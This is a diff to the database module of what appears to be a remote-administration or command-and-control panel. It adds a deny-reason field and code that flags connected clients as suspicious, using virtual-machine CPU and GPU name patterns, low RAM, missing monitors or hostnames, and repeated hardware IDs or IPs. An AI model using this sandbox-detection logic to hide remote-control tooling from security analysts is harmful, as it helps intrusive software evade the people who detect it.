@@ -133,6 +133,9 @@ try {
 try {
   db.run(`ALTER TABLE clients ADD COLUMN notifications_muted INTEGER NOT NULL DEFAULT 0`);
 } catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN deny_reason TEXT`);
+} catch {}
 
 db.run(`
   CREATE TABLE IF NOT EXISTS client_groups (
@@ -1011,6 +1014,155 @@ export function markAllClientsOffline() {
   console.log("[db] marked all clients as offline");
 }
 
+export const SUSPICIOUS_FLOOD_THRESHOLD = Math.max(2, Number(process.env.OVERLORD_SUSPICIOUS_FLOOD_THRESHOLD || 40));
+const SUSPICIOUS_IP_FLOOD_WINDOW_MS = Math.max(60_000, Number(process.env.OVERLORD_SUSPICIOUS_IP_WINDOW_MS || 300_000));
+
+export function getFloodedHwids(threshold = SUSPICIOUS_FLOOD_THRESHOLD): Set<string> {
+  const rows = db
+    .query<{ hwid: string }>(
+      `SELECT hwid FROM clients WHERE hwid IS NOT NULL AND hwid != '' GROUP BY hwid HAVING COUNT(*) >= ?`,
+    )
+    .all(threshold);
+  return new Set(rows.map((r) => r.hwid));
+}
+
+export function getFloodedHardware(threshold = SUSPICIOUS_FLOOD_THRESHOLD): Set<string> {
+  const rows = db
+    .query<{ cpu: string; gpu: string; ram: string; os: string }>(
+      `SELECT cpu, gpu, ram, os FROM clients
+       WHERE cpu IS NOT NULL AND cpu != '' AND os IS NOT NULL AND os != ''
+       GROUP BY cpu, gpu, ram, os HAVING COUNT(*) >= ?`,
+    )
+    .all(threshold);
+  const keys = new Set<string>();
+  for (const r of rows) keys.add(`${r.cpu}|${r.gpu ?? ""}|${r.ram ?? ""}|${r.os}`);
+  return keys;
+}
+
+export function getFloodedIps(threshold = SUSPICIOUS_FLOOD_THRESHOLD): Set<string> {
+  const since = Date.now() - SUSPICIOUS_IP_FLOOD_WINDOW_MS;
+  const rows = db
+    .query<{ ip: string }>(
+      `SELECT ip FROM clients WHERE ip IS NOT NULL AND ip != '' AND last_seen > ? GROUP BY ip HAVING COUNT(*) >= ?`,
+    )
+    .all(since, threshold);
+  return new Set(rows.map((r) => r.ip));
+}
+
+const FLOOD_CACHE_TTL_MS = 30_000;
+let _floodCacheTs = 0;
+let _cachedFloodedHwids: Set<string> | null = null;
+let _cachedFloodedHardware: Set<string> | null = null;
+let _cachedFloodedIps: Set<string> | null = null;
+
+function getFloodSetsWithCache(): { floodedHwids: Set<string>; floodedHardware: Set<string>; floodedIps: Set<string> } {
+  const now = Date.now();
+  if (now - _floodCacheTs > FLOOD_CACHE_TTL_MS) {
+    _cachedFloodedHwids = getFloodedHwids();
+    _cachedFloodedHardware = getFloodedHardware();
+    _cachedFloodedIps = getFloodedIps();
+    _floodCacheTs = now;
+  }
+  return { floodedHwids: _cachedFloodedHwids!, floodedHardware: _cachedFloodedHardware!, floodedIps: _cachedFloodedIps! };
+}
+
+function parseRamGb(ram: string | null | undefined): number | null {
+  if (!ram) return null;
+  const m = ram.match(/(\d+(?:\.\d+)?)\s*(tb|gb|mb|kb)/i);
+  if (!m) return null;
+  const val = parseFloat(m[1]);
+  const unit = m[2].toLowerCase();
+  if (unit === "tb") return val * 1024;
+  if (unit === "gb") return val;
+  if (unit === "mb") return val / 1024;
+  if (unit === "kb") return val / (1024 * 1024);
+  return null;
+}
+
+export type SuspiciousFlags = string[];
+
+const VM_CPU_PATTERNS = [
+  /\bqemu\b/i,
+  /\bkvm\b/i,
+  /\bvmware\b/i,
+  /\bvirtualbox\b/i,
+  /virtual\s+cpu/i,
+  /\bhyper-v\b/i,
+  /\bbochs\b/i,
+  /\bxen\b/i,
+];
+
+const VM_GPU_PATTERNS = [
+  /vmware/i,
+  /virtualbox/i,
+  /\bqemu\b/i,
+  /microsoft\s+basic\s+(render|display)/i,
+  /cirrus\s+logic/i,
+  /standard\s+vga/i,
+  /\bllvmpipe\b/i,
+  /\bsoftpipe\b/i,
+  /\bqxl\b/i,
+  /\bvirtio\b/i,
+  /hyper-v\s+video/i,
+  /terminal\s+server/i,
+  /remote\s+desktop/i,
+  /parsec\s+display/i,
+];
+
+export function computeClientSuspiciousFlags(
+  client: {
+    id?: string;
+    hwid?: string | null;
+    cpu?: string | null;
+    gpu?: string | null;
+    ram?: string | null;
+    os?: string | null;
+    host?: string | null;
+    user?: string | null;
+    ip?: string | null;
+    monitors?: number | null;
+  },
+  precomputed?: {
+    floodedHwids?: Set<string>;
+    floodedHardware?: Set<string>;
+    floodedIps?: Set<string>;
+  },
+): SuspiciousFlags {
+  const flags: string[] = [];
+  const allProvided = precomputed?.floodedHwids !== undefined && precomputed?.floodedHardware !== undefined && precomputed?.floodedIps !== undefined;
+  const sets = allProvided ? (precomputed as Required<typeof precomputed>) : getFloodSetsWithCache();
+  const fHwids = sets.floodedHwids;
+  const fHardware = sets.floodedHardware;
+  const fIps = sets.floodedIps;
+
+  if (client.hwid && fHwids.has(client.hwid)) flags.push("hwid_flood");
+
+  if (client.cpu && client.os) {
+    const hwKey = `${client.cpu}|${client.gpu ?? ""}|${client.ram ?? ""}|${client.os}`;
+    if (fHardware.has(hwKey)) flags.push("hw_flood");
+  }
+
+  if (!client.host || !client.host.trim()) flags.push("no_hostname");
+  if (!client.user || !client.user.trim()) flags.push("no_user");
+
+  if (client.ip && fIps.has(client.ip)) flags.push("ip_flood");
+
+  const cpuIsVm = !!client.cpu && VM_CPU_PATTERNS.some((p) => p.test(client.cpu!));
+  const gpuIsVm = !!client.gpu && VM_GPU_PATTERNS.some((p) => p.test(client.gpu!));
+  if (cpuIsVm || gpuIsVm) flags.push("vm_hardware");
+
+  const ramGb = parseRamGb(client.ram);
+  if (ramGb !== null && [0.25, 0.5, 1, 2, 4].some((s) => Math.abs(ramGb - s) < 0.05)) {
+    flags.push("vm_ram");
+  }
+
+  if (typeof client.monitors === "number" && client.monitors === 0) {
+    flags.push("no_monitors");
+  }
+
+  return flags;
+}
+
 export function listClients(filters: ListFilters): ListResult {
   const {
     page,
@@ -1141,7 +1293,7 @@ export function listClients(filters: ListFilters): ListResult {
 
   const rows = db
     .query<any>(
-      `SELECT c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, g.name as groupName, g.color as groupColor, c.notifications_muted as notificationsMuted
+      `SELECT c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, g.name as groupName, g.color as groupColor, c.notifications_muted as notificationsMuted, c.deny_reason as denyReason
        FROM clients c
        LEFT JOIN client_groups g ON g.id = c.group_id
        ${whereSql}
@@ -1149,6 +1301,8 @@ export function listClients(filters: ListFilters): ListResult {
        LIMIT ? OFFSET ?`,
     )
     .all(...params, pageSize, offset);
+
+  const { floodedHwids, floodedHardware, floodedIps } = getFloodSetsWithCache();
 
   const items = rows.map((c: any) => ({
     id: c.id,
@@ -1186,8 +1340,10 @@ export function listClients(filters: ListFilters): ListResult {
     groupName: c.groupName || null,
     groupColor: c.groupColor || null,
     notificationsMuted: c.notificationsMuted === 1,
+    denyReason: c.denyReason || null,
     hasThumbnail: hasThumbnail(c.id),
     thumbnailVersion: getThumbnailVersion(c.id),
+    suspiciousFlags: computeClientSuspiciousFlags(c, { floodedHwids, floodedHardware, floodedIps }),
   }));
 
   return { page, pageSize, total: totalRow.c, online: onlineRow.c, items };
@@ -1974,12 +2130,14 @@ export function setClientEnrollmentStatus(
   id: string,
   status: "approved" | "denied" | "pending",
   approvedBy?: string,
+  denyReason?: string,
 ): boolean {
   const result = db.run(
-    `UPDATE clients SET enrollment_status=?, enrolled_at=?, enrolled_by=? WHERE id=?`,
+    `UPDATE clients SET enrollment_status=?, enrolled_at=?, enrolled_by=?, deny_reason=? WHERE id=?`,
     status,
     status === "approved" ? Date.now() : null,
     status === "approved" ? (approvedBy ?? null) : null,
+    status === "denied" ? (denyReason ?? null) : null,
     id,
   );
   return ((result as any)?.changes || 0) > 0;
